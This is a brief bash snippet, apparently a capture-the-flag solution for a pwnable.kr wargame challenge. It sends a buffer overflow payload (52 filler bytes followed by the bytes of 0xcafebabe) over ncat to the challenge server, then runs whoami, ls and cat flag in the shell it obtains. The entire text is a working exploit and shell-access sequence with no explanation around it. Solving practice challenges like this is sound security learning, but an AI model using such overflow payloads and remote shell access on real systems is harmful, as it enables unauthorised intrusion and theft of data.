
```bash
$ (python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex("41"*52+"bebafeca"))';cat) | ncat -v pwnable.kr 9000
whoami
ls
cat flag
```
